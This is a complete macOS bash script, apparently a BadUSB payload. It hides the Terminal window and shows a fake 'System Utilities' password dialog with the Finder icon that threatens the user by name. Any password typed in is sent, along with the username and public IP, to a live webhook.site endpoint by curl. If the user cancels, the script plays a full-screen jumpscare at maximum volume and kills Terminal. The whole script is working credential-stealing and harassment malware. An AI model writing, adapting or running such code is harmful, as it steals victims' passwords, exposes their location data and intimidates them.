#!/bin/bash
# Combined Login Prompt with Jumpscare Fallback for macOS
# ----------------------------------------------------------------
# - Displays a login prompt:
#     "I know where you live, [FirstName]."
#     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
# - If a non-empty password is entered, it sends the password, public IP,
#   and username to your custom HTTP endpoint (Webhook.site) using Ruby for JSON generation.
# - If the user cancels (or leaves the password empty), it downloads and plays
#   a jumpscare video (from GitHub) in Safari (full-screen, at max volume).
# - Finally, it force-kills Terminal.
#
# Requirements:
#   - macOS with osascript, curl, and Ruby installed (Ruby is preinstalled on macOS).
#
# Usage:
#   chmod +x combined_script.sh
#   ./combined_script.sh

# --- Hide Terminal Immediately ---
osascript -e 'tell application "Terminal" to set visible of front window to false'

# --- Get Current Username ---
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# --- Initialize Capture Data ---
capture="username=${username}\n____________________________________________\n\n"

# --- Define AppleScript Login Prompt (Single Attempt) ---
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
try
    set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    return userPassword
on error
    return ""
end try
EOF

# --- Execute the Login Prompt and Capture Output ---
osascript -e "$applescriptCode" > /tmp/pass_temp.txt
password=$(cat /tmp/pass_temp.txt)
rm /tmp/pass_temp.txt

# --- Branch Based on User Input ---
if [ -z "$password" ]; then
    # User canceled (or provided an empty password) – trigger jumpscare.
    echo "User canceled login prompt. Triggering jumpscare..."
    
    # --- Define the Jumpscare Video URL (GitHub Raw Link) ---
    VIDEO_URL="https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
    HTML_FILE="/tmp/jumpscare.html"
    
    # --- Create a Temporary HTML File that Embeds the Video ---
    cat <<EOF > "$HTML_FILE"
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        background-color: black;
      }
      video {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay muted playsinline>
      <source src="$VIDEO_URL" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      // Ensure playback starts.
      video.play();
      video.addEventListener('loadeddata', function() {
        setTimeout(function(){
          // Request fullscreen.
          if (video.requestFullscreen) {
            video.requestFullscreen();
          } else if (video.webkitRequestFullscreen) {
            video.webkitRequestFullscreen();
          } else if (video.msRequestFullscreen) {
            video.msRequestFullscreen();
          }
          // Unmute and resume playback.
          video.muted = false;
          video.play();
        }, 500);
      });
    </script>
  </body>
</html>
EOF

    # --- Set System Volume to Maximum ---
    osascript -e 'set volume output volume 100'
    
    # --- Open the Temporary HTML File in Safari ---
    open -a Safari "$HTML_FILE"
    osascript -e 'display notification "JumpScare video playing in full screen." with title "JumpScare"'
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
else
    # User provided a password – proceed to send data to your HTTP endpoint.
    echo "Password entered: $password"
    capture="${capture}password=${password}\n"
    
    # --- Retrieve Public IP Address ---
    ipaddress=$(curl -s https://api.ipify.org)
    capture="${capture}ipaddress=${ipaddress}"
    
    # --- Save Data to Temporary File ---
    echo -e "$capture" > /tmp/pass.txt
    
    # --- Generate JSON Payload Using Ruby (fallback to sed if Ruby is missing) ---
    if command -v ruby &>/dev/null; then
        payload=$(ruby -r json -e 'puts JSON.generate({"content"=>STDIN.read.strip})' < /tmp/pass.txt)
    else
        json_content=$(sed ':a;N;$!ba;s/\n/\\n/g' /tmp/pass.txt | sed 's/"/\\"/g')
        payload=$(printf '{"content": "%s"}' "$json_content")
    fi
    
    # --- Send Payload to Custom HTTP Endpoint (Webhook.site) ---
    CUSTOM_ENDPOINT="https://webhook.site/41aa5760-13a8-429c-8443-82d078c7859b"
    curl -X POST -H "Content-Type: application/json" -d "$payload" "$CUSTOM_ENDPOINT"
    rm /tmp/pass.txt
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
fi
